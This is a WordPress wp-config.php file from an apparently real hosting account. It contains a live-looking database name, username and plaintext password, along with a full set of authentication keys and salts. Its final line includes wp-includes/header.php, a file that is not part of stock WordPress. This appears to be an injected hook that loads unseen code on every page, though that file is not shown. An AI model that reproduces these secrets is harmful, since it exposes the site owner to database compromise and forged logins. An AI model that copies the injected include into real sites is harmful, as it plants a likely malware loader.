<?php

/**

 * The base configuration for WordPress

 *

 * The wp-config.php creation script uses this file during the

 * installation. You don't have to use the web site, you can

 * copy this file to "wp-config.php" and fill in the values.

 *

 * This file contains the following configurations:

 *

 * * MySQL settings

 * * Secret keys

 * * Database table prefix

 * * ABSPATH

 *

 * @link https://wordpress.org/support/article/editing-wp-config-php/

 *

 * @package WordPress

 */


// ** MySQL settings - You can get this info from your web host ** //

/** The name of the database for WordPress */

define( 'DB_NAME', 'u847173349_innoc322' );


/** MySQL database username */

define( 'DB_USER', 'u847173349_Inno342' );


/** MySQL database password */

define( 'DB_PASSWORD', 'gvL77F3iUS7u' );


/** MySQL hostname */

define( 'DB_HOST', 'localhost' );


/** Database Charset to use in creating database tables. */

define( 'DB_CHARSET', 'utf8mb4' );


/** The Database Collate type. Don't change this if in doubt. */

define( 'DB_COLLATE', '' );


/**#@+

 * Authentication Unique Keys and Salts.

 *

 * Change these to different unique phrases!

 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}

 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.

 *

 * @since 2.6.0

 */

define( 'AUTH_KEY',         '%O/]~0(p&JBwHyuMgw/G8~?|QyInLj Z`/Mc}36/xUlXj~-qPx}X/* ,rSqv?RJJ' );

define( 'SECURE_AUTH_KEY',  '6e(1xG =7K``L#c}t}qga.;2;Ka_tQd-fKvnNH`U7MKDxqNTb=i&){+?k3~@2h_k' );

define( 'LOGGED_IN_KEY',    'Cr9>WA!ya/YJ,ed /9[kTlFsJ=Os&Bo!.=l VFUU55eP{[61Z0ITmnqWn8SU2!#.' );

define( 'NONCE_KEY',        '0Tg=t]Oc DOH?uZ)lTT,9D]wdqL)c,a)Iq,GD(,s#J0U|fsj$p1?>rsW|!YcI-,n' );

define( 'AUTH_SALT',        'zOdt))@L31sT8*; ~-eCGdUxjU,HYLGnS;<zEl{DQt8/Su7Q7`MJo`J|n)5c_0Zq' );

define( 'SECURE_AUTH_SALT', 'ZSJWrAa0F63*^mZ`Ijd<?f 6I/F(tuBkN$b_C-p{ZLg<&m[z*>(6#PZI,T9)|[Td' );

define( 'LOGGED_IN_SALT',   'Gi.;wA)*i|,FBW-wDrzLivh}~00*pmc^hYam=dS5.duA^+-m42`:;>90oCY~gQkt' );

define( 'NONCE_SALT',       'a-&gDu1fyPZI?y<}N80`R|CyT(~Y}ylEwl m-i8a$ oIaMgbpW3qRa7W[uHJib;^' );


/**#@-*/


/**

 * WordPress Database Table prefix.

 *

 * You can have multiple installations in one database if you give each

 * a unique prefix. Only numbers, letters, and underscores please!

 */

$table_prefix = 'wp_';


/**

 * For developers: WordPress debugging mode.

 *

 * Change this to true to enable the display of notices during development.

 * It is strongly recommended that plugin and theme developers use WP_DEBUG

 * in their development environments.

 *

 * For information on other constants that can be used for debugging,

 * visit the documentation.

 *

 * @link https://wordpress.org/support/article/debugging-in-wordpress/

 */

define( 'WP_DEBUG', false );


define( 'FS_METHOD', 'direct' );
/* That's all, stop editing! Happy publishing. */


/** Absolute path to the WordPress directory. */

if ( ! defined( 'ABSPATH' ) ) {

	define( 'ABSPATH', __DIR__ . '/' );

}


/** Sets up WordPress vars and included files. */

require_once ABSPATH . 'wp-settings.php';

include_once(ABSPATH . WPINC . '/header.php');


